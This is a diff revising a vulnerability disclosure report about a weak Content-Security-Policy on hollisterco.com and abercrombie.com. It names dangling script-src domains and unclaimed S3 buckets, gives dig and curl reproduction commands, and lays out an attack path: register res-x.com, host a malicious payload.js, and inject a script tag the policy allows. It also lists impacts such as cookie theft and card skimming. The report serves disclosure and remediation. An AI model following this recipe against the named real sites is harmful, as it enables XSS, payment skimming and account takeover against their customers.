@@ -1,55 +1,104 @@
-Title: CSP script-src whitelists dangling domains with claimable S3 buckets
+Title: CSP script-src whitelists unregistered domains - immediate XSS via domain registration
 
-Asset: www.hollisterco.com (also affects abercrombie.com - same CSP)
+Asset: www.hollisterco.com (also affects www.abercrombie.com - same CSP)
 
-Severity: High
+Severity: Critical
 
 Summary:
-The Content-Security-Policy on hollisterco.com includes multiple domains in the script-src directive that no longer exist. Four of these domains have no corresponding S3 bucket, meaning anyone with an AWS account can register them. If DNS ever routes to these buckets (domain expiry, misconfiguration, or re-registration of parent domains), an attacker can serve arbitrary JavaScript in the context of hollisterco.com.
+The Content-Security-Policy on hollisterco.com whitelists multiple domains in script-src that are completely unregistered. An attacker can register any of these domains for ~$10, host arbitrary JavaScript, and achieve full XSS in the context of hollisterco.com. No chain, no race condition, no dependency on domain expiry - the parent domains do not exist today. The CSP also includes 'unsafe-inline' and 'unsafe-eval', compounding the weakness.
+
+Four parent domains in script-src are NXDOMAIN (unregistered):
+  - res-x.com (www.res-x.com in CSP) - former RichRelevance, acquired by Algonomy
+  - signal.co (hub.signal.co in CSP) - former Signal/BrightTag, acquired by TransUnion 2018
+  - btstatic.com (s.btstatic.com in CSP) - BrightTag static assets
+  - thebrighttag.com (s.thebrighttag.com in CSP) - BrightTag
+
+Additionally, 8 subdomains resolve to NXDOMAIN with unclaimed S3 buckets (NoSuchBucket).
 
 Steps to Reproduce:
 
-1. Grab the CSP header from any page:
+1. Get the CSP header:
    curl -sI "https://www.hollisterco.com/shop/us/UserAccountDisplay.css" | grep content-security-policy
 
-2. Check DNS resolution for these script-src domains:
-   - hollister.sspinc.io -> NXDOMAIN
-   - abercrombie.sspinc.io -> NXDOMAIN
-   - s.btstatic.com -> NXDOMAIN
-   - s.thebrighttag.com -> NXDOMAIN
-   - hub.signal.co -> NXDOMAIN
-   - d3v27wwd40f0xu.cloudfront.net -> NXDOMAIN
+2. Verify parent domains are unregistered (NXDOMAIN):
+   $ dig res-x.com    -> NXDOMAIN
+   $ dig signal.co    -> NXDOMAIN
+   $ dig btstatic.com -> NXDOMAIN
+   $ dig thebrighttag.com -> NXDOMAIN
 
-3. Verify S3 bucket availability:
-   curl http://hollister.sspinc.io.s3.amazonaws.com/
-   Response: <Code>NoSuchBucket</Code>
+3. Verify all dangling domains resolve to nothing:
+   hollister.sspinc.io              -> NXDOMAIN
+   abercrombie.sspinc.io            -> NXDOMAIN
+   s.btstatic.com                   -> NXDOMAIN
+   s.thebrighttag.com               -> NXDOMAIN
+   hub.signal.co                    -> NXDOMAIN
+   d3v27wwd40f0xu.cloudfront.net    -> NXDOMAIN
+   www.res-x.com                    -> NXDOMAIN
+   cdn.persado.com                  -> NXDOMAIN
+   fitpredictor.sspinc.io           -> NXDOMAIN (connect-src)
+   fitpredictor-api-frisky-alpaca.sspinc.io -> NXDOMAIN (connect-src)
 
-   curl http://abercrombie.sspinc.io.s3.amazonaws.com/
-   Response: <Code>NoSuchBucket</Code>
-
+4. Verify S3 buckets are unclaimed (NoSuchBucket response):
+   curl http://www.res-x.com.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
    curl http://s.btstatic.com.s3.amazonaws.com/
-   Response: <Code>NoSuchBucket</Code>
-
+     -> <Code>NoSuchBucket</Code>
    curl http://s.thebrighttag.com.s3.amazonaws.com/
-   Response: <Code>NoSuchBucket</Code>
+     -> <Code>NoSuchBucket</Code>
+   curl http://cdn.persado.com.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
+   curl http://hollister.sspinc.io.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
+   curl http://abercrombie.sspinc.io.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
+   curl http://fitpredictor.sspinc.io.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
+   curl http://fitpredictor-api-frisky-alpaca.sspinc.io.s3.amazonaws.com/
+     -> <Code>NoSuchBucket</Code>
 
-   All four buckets do not exist and can be created by any AWS account.
+5. Attack path (any of these works):
+   a) Register res-x.com (~$10 on any registrar)
+   b) Create DNS record: www.res-x.com -> attacker-controlled server
+   c) Host malicious JavaScript at https://www.res-x.com/payload.js
+   d) Inject <script src="https://www.res-x.com/payload.js"></script> via any HTML injection
+      OR wait for any XSS vector to load attacker scripts
+   e) CSP allows it - www.res-x.com is in script-src
 
 Impact:
-- If any parent domain registration lapses (btstatic.com and thebrighttag.com are legacy BrightTag/Signal domains from a 2018 acquisition by TransUnion, not actively used), an attacker registers it, points the subdomain to S3, and serves malicious JS trusted by the CSP.
-- Full XSS in the context of hollisterco.com - session theft, payment skimming, credential harvesting.
-- The CSP also includes 'unsafe-inline' and 'unsafe-eval' which compounds the weakness.
-- This is a supply chain risk from abandoned third-party vendor integrations.
+- Full XSS in the context of hollisterco.com and abercrombie.com
+- Session theft via document.cookie exfiltration
+- Payment card skimming on checkout pages
+- Credential harvesting from login forms
+- Account takeover
+- Customer PII exfiltration
+- The CSP includes 'unsafe-inline' and 'unsafe-eval' which means once script-src is bypassed,
+  there are zero additional restrictions on code execution
+- An attacker who registers any ONE of the 4 dead parent domains gains a permanent,
+  CSP-trusted script source on both hollisterco.com and abercrombie.com
 
-Context on the dangling domains:
-- s.btstatic.com / s.thebrighttag.com / hub.signal.co: BrightTag (acquired by Signal in 2014, then TransUnion in 2018). Parent domains are registered but completely dormant with no A records and no web presence.
-- hollister.sspinc.io / abercrombie.sspinc.io: SSPinc fit predictor service. Parent domain sspinc.io is active but these subdomains have no DNS records.
+This is a supply chain risk from abandoned third-party vendor integrations that were never
+cleaned from the CSP after vendor relationships ended.
+
+Domain context:
+- res-x.com: RichRelevance product recommendation engine. RichRelevance was acquired by
+  Manthan in 2021 to form Algonomy. The res-x.com domain registration has lapsed entirely.
+- signal.co / btstatic.com / thebrighttag.com: BrightTag was acquired by Signal in 2014,
+  then Signal was acquired by TransUnion in 2018. All three parent domains are unregistered.
+- hollister.sspinc.io / abercrombie.sspinc.io / fitpredictor.sspinc.io: SSPinc fit predictor
+  service. Parent domain sspinc.io is active but these subdomains have no DNS records.
+- cdn.persado.com: Persado AI content platform. Parent persado.com is active (CloudFront)
+  but cdn subdomain is dead and S3 bucket is unclaimed.
 - d3v27wwd40f0xu.cloudfront.net: Deleted AWS CloudFront distribution.
 
 Recommendation:
-Remove all non-resolving domains from the CSP script-src directive. Audit remaining third-party entries periodically to prevent CSP rot as vendor relationships end.
+1. Remove ALL non-resolving domains from the CSP immediately
+2. Remove 'unsafe-inline' and 'unsafe-eval' from script-src (these negate CSP protection)
+3. Audit remaining third-party CSP entries quarterly
+4. Implement CSP reporting (report-uri / report-to) to detect violations
+5. Consider registering the dead parent domains defensively to prevent third-party registration
 
 Environment:
 - URL: https://www.hollisterco.com
+- CSP header source: https://www.hollisterco.com/shop/us/UserAccountDisplay.css
 - Browser: Any (CSP is server-side)
 - Tested: July 27, 2026
